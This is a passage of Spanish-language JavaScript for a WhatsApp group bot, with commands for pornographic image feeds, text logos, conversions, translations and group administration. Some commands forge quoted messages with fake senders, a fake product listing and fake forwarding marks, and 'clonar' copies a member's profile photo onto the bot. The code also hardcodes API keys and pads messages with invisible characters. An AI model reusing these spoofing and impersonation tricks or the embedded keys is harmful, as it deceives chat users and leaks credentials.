͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${teks2}`
				samu330.sendMessage(from, hasil, text, {
					quoted: fimg
				})
				break
			
			case 'online':
				let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
				let online = [...Object.keys(samu330.chats.get(ido).presences), samu330.user.jid]
				samu330.sendMessage(from, 'Lista de usuarios en linea:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, MessageType.text, {
					quoted: fdoc,
					contextInfo: { mentionedJid: online }
				})
				break
			case 'soyyo':
				if (!isRegister) return reply(mess.only.usrReg)
				try {
					ppimg = await samu330.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				nombredelwe = wa.getUserName(sender)
				teks = `‣ *Nombre* : ${nombredelwe}
‣ *Número* : ${sender.split("@")[0]}
‣ *Link* : wa.me/${sender.split("@")[0]}`
				its = await getBuffer(ppimg)
				samu330.sendMessage(from, its, image, {
					quoted: fliveLoc, caption: teks, contextInfo: { "forwardingScore": 9999, "isForwarded": true }
				})

				break
			case 'pastebin':
				if (args.length < 1) return reply('Escribe el texto que se mostrara en pastebin.')
				paste = `${args.join(' ')}`
				reply(mess.wait)
				anu = await getJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${paste}`, { method: 'get' })
				samu330.sendMessage(from, `${anu.result}`, MessageType.text, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				break

			case 'abinario':
				if (args.length < 1) return reply('Escribe el texto a convertir a codigo binario.')
				encbinary = `${args.join(' ')}`
				anu = await getJson(`https://api.anoncybfakeplayer.com/api/binary/?encode=${encbinary}`, { method: 'get' })
				samu330.sendMessage(from, `${anu.result}`, MessageType.text, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				break
			case 'binatext':
				if (args.length < 1) return reply('Porfavor, pega o escribe el codigo binario para convertir a texto.')
				decbin = `${args.join(' ')}`
				anu = await getJson(`https://api.anoncybfakeplayer.com/api/binary/?decode=${decbin}`, { method: 'get' })
				samu330.sendMessage(from, `${anu.result}`, MessageType.text, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				break

			case 'aoctal':
				if (args.length < 1) return reply('Escribe el texto a convertir a codigo octal.')
				encbinary = `${args.join(' ')}`
				anu = await getJson(`https://api.anoncybfakeplayer.com/api/octal/?encode=${encbinary}`, { method: 'get' })
				samu330.sendMessage(from, `${anu.result}`, MessageType.text, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				break
			case 'octalatext':
				if (args.length < 1) return reply('Porfavor, pega o escribe el codigo octal para convertir a texto.')
				decbin = `${args.join(' ')}`
				anu = await getJson(`https://api.anoncybfakeplayer.com/api/octal/?decode=${decbin}`, { method: 'get' })
				samu330.sendMessage(from, `${anu.result}`, MessageType.text, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				break


			case 'ahex':
				if (args.length < 1) return reply('Escribe el texto a convertir a codigo hex.')
				encbinary = `${args.join(' ')}`
				anu = await getJson(`https://api.anoncybfakeplayer.com/api/hex/?encode=${encbinary}`, { method: 'get' })
				samu330.sendMessage(from, `${anu.result}`, MessageType.text, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				break
			case 'hexatext':
				if (args.length < 1) return reply('Porfavor, pega o escribe el codigo hex para convertir a texto.')
				decbin = `${args.join(' ')}`
				anu = await getJson(`https://api.anoncybfakeplayer.com/api/hex/?decode=${decbin}`, { method: 'get' })
				samu330.sendMessage(from, `${anu.result}`, MessageType.text, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				break
			case 'tourl':
				if (!isRegister) return reply(mess.only.userB)
				var imgbb = require('imgbb-uploader')
				if ((isMedia && !samu.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(samu).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					reply(mess.wait)
					owgi = await samu330.downloadAndSaveMediaMessage(ger)
					anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi)
					teks = `${anu.display_url}`
					reply(teks)
				}
				break
			case 'lesbian':
				if (!isGroup) return reply(mess.only.group)
				if (!isNsfw) return reply(mess.nsfw)
				porn = await getJson('https://meme-api.herokuapp.com/gimme/lesbians', {
					method: 'get'
				})
				reply(mess.wait)
				buffer = await getBuffer(`${porn.url}`)
				samu330.sendMessage(from, buffer, image, {
					fimg
				})
				break

			case 'tetas':
				if (!isGroup) return reply(mess.only.group)
				if (!isNsfw) return reply(mess.nsfw)
				pw = ["https://meme-api.herokuapp.com/gimme/tits",
					"https://meme-api.herokuapp.com/gimme/BestTits",
					"https://meme-api.herokuapp.com/gimme/boobs",
					"https://meme-api.herokuapp.com/gimme/amazingtits",
					"https://meme-api.herokuapp.com/gimme/TinyTits"]
				nk = pw[Math.floor(Math.random() * pw.length)]
				porn = await getJson(`${nk}`, {
					method: 'get'
				})
				reply(mess.wait)
				buffer = await getBuffer(`${porn.url}`)
				samu330.sendMessage(from, buffer, image, {
					quoted: fimg
				})
				break

			case 'ass':
				if (!isGroup) return reply(mess.only.group)
				if (!isNsfw) return reply(mess.nsfw)
				pw = ["https://meme-api.herokuapp.com/gimme/CuteLittleButts",
					"https://meme-api.herokuapp.com/gimme/ass",
					"https://meme-api.herokuapp.com/gimme/boobs",
					"https://meme-api.herokuapp.com/gimme/ass"]
				nk = pw[Math.floor(Math.random() * pw.length)]
				porn = await getJson(`${nk}`, {
					method: 'get'
				})
				reply(mess.wait)
				buffer = await getBuffer(`${porn.url}`)
				samu330.sendMessage(from, buffer, image, {
					quoted: fimg
				})
				break
			//Esta funcion fue creada gracias a la api de fxc-7
			case 'porno':
				if (!isGroup) return reply(mess.only.group)
				if (!isNsfw) return reply(mess.nsfw)
				pornito = ["https://fxc7-api.herokuapp.com/api/amateur?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/anal_gape?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/asian?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ass-fucking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/japanese?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/babe?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/ball_licking?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/porn/bath?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/anal_penetration?apikey=Fxc7", "https://fxc7-api.herokuapp.com/api/sex/areolae?apikey=Fxc7"]
				nopor = pornito[Math.floor(Math.random() * pornito.length)]
				reply('*Espera un momento porfavor*')
				iwant = await getJson(`${nopor}`, { method: 'get' })
				you = await getBuffer(`${iwant.result}`)
				samu330.sendMessage(from, you, image, { quoted: fvid, caption: '🍒', sendEphemeral: true })
				break


			case 'pussy':
				if (!isGroup) return reply(mess.only.group)
				if (!isNsfw) return reply(mess.nsfw)
				pw = ["https://meme-api.herokuapp.com/gimme/pussy",
					"https://meme-api.herokuapp.com/gimme/LegalTeens"
				]
				nk = pw[Math.floor(Math.random() * pw.length)]
				porn = await getJson(`${nk}`, {
					method: 'get'
				})
				reply(mess.wait)
				buffer = await getBuffer(`${porn.url}`)
				samu330.sendMessage(from, buffer, image, {
					quoted: fimg
				})
			break
			case 'xdxd':
					if (!isGroup) return reply(mess.only.group)
					if (!isNsfw) return reply(mess.nsfw)
					xdxd = ["https://nekos.life/api/v2/img/neko","https://nekos.life/api/v2/img/neko"]
					sxdxd = xdxd[Math.floor(Math.random() * xdxd.length)]
					rxdxd = await getJson(`${sxdxd}`, {
						method: 'get'
					})
					reply(mess.wait)
					buffer = await getBuffer(`${rxdxd.url}`)
					samu330.sendMessage(from, buffer, image, {
						quoted: fimg
					})
			break

			case 'simi':

				samu330.updatePresence(from, Presence.composing)
				texto = body.slice(5)
				sim = await getJson(`https://api.simsimi.net/v1/?text=${texto}&lang=es`)
				smuu = (`${sim.success}`)
				samu330.sendMessage(from, smuu, MessageType.text, {
					quoted: {
						key: {
							fromMe: false,
							participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
						},
						message: {
							"productMessage": {
								"product": {
									"productImage": {
										"mimetype": "image/jpeg",
										"jpegThumbnail": fs.readFileSync(`./src/simi.jpg`)
									},
									"title": `➫𝐒𝐢𝐦𝐬𝐢𝐦𝐢 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲🔥❣️`,
									"description": `${texto}`,
									"currencyCode": '',
									"priceAmount1000": "999999999999999999999",
									"retailerId": 'TOM',
									"productImageCount": 999
								},
								"businessOwnerJid": `0@s.whatsapp.net`
							}
						}
					}
				})

				break
			case 'emoji':

				if (args.length == 0) return reply(`Ejemplo: ${prefix + command} 😭`)
				emoji = args[0]
				try {
					emoji = encodeURIComponent(emoji[0])
				} catch {
					emoji = encodeURIComponent(emoji)
				}
				ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${api}`)
				await samu330.sendMessage(from, ini_buffer, sticker, { quoted: ftoko })
				break

			case 'blackpink':
			case 'neon':
			case 'greenneon':
			case 'advanceglow':
			case 'futureneon':
			case 'sandwriting':
			case 'sandsummer':
			case 'sandengraved':
			case 'metaldark':
			case 'neonlight':
			case 'holographic':
			case 'text1917':
			case 'minion':
			case 'deluxesilver':
			case 'newyearcard':
			case 'bloodfrosted':
			case 'halloween':
			case 'jokerlogo':
			case 'fireworksparkle':
			case 'natureleaves':
			case 'bokeh':
			case 'toxic':
			case 'strawberry':
			case 'box3d':
			case 'roadwarning':
			case 'breakwall':
			case 'icecold':
			case 'luxury':
			case 'cloud':
			case 'summersand':
			case 'horrorblood':
			case 'thunder':

				if (args.length == 0) return reply(`Example: ${prefix + command} Samu330`)
				reply(mess.wait)
				ini_txt = args.join(" ")
				try {
					logo = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${api}&text=${ini_txt}`)
					samu330.sendMessage(from, logo, image)
				} catch {
					reply(mess.ferr)
				}

				break
			case 'pornhub':
			case 'glitch':
			case 'avenger':
			case 'space':
			case 'ninjalogo':
			case 'marvelstudio':
			case 'lionlogo':
			case 'wolflogo':
			case 'steel3d':
			case 'wallgravity':

				if (args.length == 0) return reply(`Example: ${prefix + command} Samu330|Sam y Perry`)
				reply(mess.wait)
				a = args.join(' ')
				txt1 = a.substring(0, a.indexOf('|') - 0)
				txt2 = a.substring(a.lastIndexOf('|') + 1)
				if (!txt1) return reply(`Error de uso...\n*Ejemplo: ${prefix + command} Samu|330*`)
				if (!txt2) return reply(`Error de uso...\n*Ejemplo: ${prefix + command} Samu|330*`)
				try {
					logo = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${api}&text1=${txt1}&text2=${txt2}`)
					samu330.sendMessage(from, logo, image)
				} catch {
					reply(mess.ferr)
				}

				break



			case 'sombra':
			case 'cup':
			case 'cup1':
			case 'romance':
			case 'smoke':
			case 'burnpaper':
			case 'lovemessage':
			case 'undergrass':
			case 'love':
			case 'cafe':
			case 'woodheart':
			case 'woodenboard':
			case 'summer3d':
			case 'wolfmetal':
			case 'nature3d':
			case 'underwater':
			case 'golderrose':
			case 'summernature':
			case 'letterleaves':
			case 'glowingneon':
			case 'fallleaves':
			case 'flamming':
			case 'hp':
			case 'carvedwood':

				if (args.length == 0) return reply(`Example: ${prefix + command} Samu330`)
				reply(mess.wait)
				ini_txt = args.join(' ')
				try {
					logo = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${api}&text=${ini_txt}`)
					samu330.sendMessage(from, logo, image)
				} catch {
					reply(mess.ferr)
				}

				break
			case 'tiktok':
			case 'arcade8bit':
			case 'battlefield4':
			case 'pubg':

				if (args.length == 0) return reply(`Example: ${prefix + command} Samu330|Sam y Perry`)
				reply(mess.wai)
				a = args.join(' ')
				txt1 = a.substring(0, a.indexOf('|') - 0)
				txt2 = a.substring(a.lastIndexOf('|') + 1)
				if (!txt1) return reply(`Error de uso...\n*Ejemplo: ${prefix + command} Samu|330*`)
				if (!txt2) return reply(`Error de uso...\n*Ejemplo: ${prefix + command} Samu|330*`)
				try {
					logo = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${api}&text1=${txt1}&text2=${txt2}`)
					samu330.sendMessage(from, logo, image)
				} catch {
					reply(mess.ferr)
				}

				break

			// Ephoto 360 //
			case 'wetglass':
			case 'multicolor3d':
			case 'watercolor':
			case 'luxurygold':
			case 'galaxywallpaper':
			case 'lighttext':
			case 'beautifulflower':
			case 'puppycute':
			case 'royaltext':
			case 'heartshaped':
			case 'birthdaycake':
			case 'galaxystyle':
			case 'hologram3d':
			case 'greenneon':
			case 'glossychrome':
			case 'greenbush':
			case 'metallogo':
			case 'noeltext':
			case 'glittergold':
			case 'textcake':
			case 'starsnight':
			case 'wooden3d':
			case 'textbyname':
			case 'writegalacy':
			case 'galaxybat':
			case 'snow3d':
			case 'birthdayday':
			case 'goldplaybutton':
			case 'silverplaybutton':
			case 'freefire':

				if (args.length == 0) return reply(`Example: ${prefix + command} Sam y Perry`)
				reply(mess.wait)
				ini_txt = args.join(' ')
				try {
					logo = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${api}&text=${ini_txt}`)
					samu330.sendMessage(from, logo, image)
				} catch {
					reply(mess.ferr)
				}

				break
			case 'chat':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				var pc = budy.slice(6)
				var nomor = pc.split("|")[0];
				var org = pc.split("|")[1];
				samu330.sendMessage(nomor + '@s.whatsapp.net', org, MessageType.text)
				reply(`*El memsaje:* ${org} *Se envio a:* ${nomor}`)
				break
			case 'setpic':
				if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
				samu330.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply(`Envia una imagen con el comando: *${prefix}setpp*`)
				var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				var media2 = await samu330.downloadAndSaveMediaMessage(media1)
				await samu330.updateProfilePicture(meNumber, media2)
				reply('*Yap*')
				break

			case 'kick':
			case 'eliminar':
				if (!isGroup) return reply(mess.only.group)
				if (!isAdmin) return reply(mess.only.admin)
				if (!botAdmin) return reply(mess.only.Badmin)
				if (sam.message.extendedTextMessage != undefined) {
					mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
					if (!mentioned) return reply(`exampol xd: ${prefix + command} @participante... o etiqueta el mensaje de la persona a eliminar`)
					await wa.FakeTokoForwarded(from, `Baaaiii...`, '')
					if (mentionUser.length == 1)
						samu330.groupRemove(from, mentionUser)
					//samu330.groupRemove(from, mentioned)
				} else {
					await wa.FakeTokoForwarded(from, `Baaaiii...`, '')
					samu330.groupRemove(from, mentioned)
				}
				break

			case 'translate':
				if (args.length == 0) return reply(`Example: ${prefix + command} es Hi bro`)
				idioma = args[0]
				args.shift()
				ini_txt = args.join(' ')
				get_result = await getJson(`https://api.lolhuman.xyz/api/translate/auto/${idioma}?apikey=${api}&text=${ini_txt}`)
				get_result = get_result.result
				init_txt = `Traduccion de : ${get_result.from}\n`
				init_txt += `a : ${get_result.to}\n`
				init_txt += `Original : ${get_result.original}\n`
				init_txt += `Traducido : ${get_result.translated}\n`
				init_txt += `Pronunciacion : ${get_result.pronunciation}\n`
				reply(init_txt)

				break
			case 'ping':
				var groups = samu330.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = samu330.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
				uptime = process.uptime();
				const timestamp = speed();
				const totalChat = await samu330.chats.all()
				const latensi = speed() - timestamp
				//	const total12 = math(`${groups.length}*${privat.length}`)
				teks = `_Pong_ xD\n*ESTADISTICAS DEL BOT:*\n*- Group Chats :* ${groups.length}\n*- Private Chats :* ${privat.length}\n*- Total Chats :* ${totalChat.length}\n*- Speed :* ${latensi.toFixed(4)} _Second_\n*- Active Time :* ${uptime}\n\n*PHONE STATISTICS:*\n*- 📱Capacidad de Ram :* ${ram2}\n*- 💻Plataforma :* ${os.platform()}\n*- 🌐Hostname :* ${os.hostname()}\n*- 🕐Uptime :* ${os.uptime()}\n*- 🪀Wa Version:* ${samu330.user.phone.wa_version}\n*- 📡Os Version:* ${samu330.user.phone.os_version}\n*- 🔐Device Manufacturer:* ${samu330.user.phone.device_manufacturer}\n*- 📲Device Model:* ${samu330.user.phone.device_model}\n*- 🧬Os Build Number:* ${samu330.user.phone.os_build_number}\n`
				samu330.sendMessage(from, teks, MessageType.text, { quoted: fdoc, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				break
			case 'clonar':
				if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply('Etiqueta a alguien para utilizar su foto!!!')
				if (sam.message.extendedTextMessage === undefined || sam.message.extendedTextMessage === null) return reply('Etiqueta a alguien')
				mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid[0]
				let { jid, id3, notify } = groupMembers.find(x => x.jid === mentioned)
				try {
					pp = await samu330.getProfilePicture(mentioned)
					buffer = await getBuffer(pp)
					samu330.updateProfilePicture(botNumber, buffer)
					mentions(`La foto de perfil se actualizó correctamente con la foto de perfil de: @${mentioned.split('@')[0]}`, [jid], true)
				} catch (e) {
					reply(mess.ferr)
				}

				break
			case 'queanime':
				if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
					reply(mess.wait)
					const encmediaa = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					const mediaa = await samu330.downloadMediaMessage(encmediaa)
					await wait(mediaa).then(res => {
						samu330.sendMessage(from, res.video, video, { quoted: ftoko, caption: res.teks.trim() })
					}).catch(err => {
						reply(err)
					})
				} else {
					reply('Envia la magen para poder buscar el anime')
				}
				break
			case 'colores':
				if (args.length < 1) return reply('Y el texto?')
				var teks = encodeURIComponent(args.join(' '))
				const attp1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${teks}`)
				samu330.sendMessage(from, attp1, sticker, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })

				break

			case 'añadir':
				if (!isGroup) return reply(mess.only.group)
				if (!botAdmin) return reply(mess.only.Badmin)
				if (args.length < 1) return reply('Y el numero?')
				if (args[0].startsWith('99')) return reply('Utiliza el codigo de pais')
				try {
					num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
					samu330.groupAdd(from, [num])
				} catch (e) {
					console.log('Error :', e)
					return samu330.sendMessage(from, 'Modo privado dice:v', MessageType.text)
				}

				break

			case 'public':
				if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (public) return await reply('*El modo publico Ya esta activado*')
				config["public"] = true
				public = true
				fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
				await wa.sendFakeStatus(from, "*Se activo el modo publico*", "Public : true")
				break
			case 'self':
				if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (!public) return await reply('El modo privado ya estaba activado')
				config["public"] = false
				public = false
				fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
				await wa.sendFakeStatus(from, "*Se a cambiado a modo PRIVADO*", "Self : true")
				break
			case 'bc':
				if (!isOwner) return reply('Solo *Samu* puede usar este comando')
				if (args.length < 1) return reply('Y el anuncio?')
				anu = await samu330.chats.all()
				if (isMedia && !sam.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					buff = await samu330.downloadMediaMessage(encmedia)
					for (let _ of anu) {
						samu330.sendMessage(_.jid, buff, image, { caption: `${body.slice(4)}\n\n ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏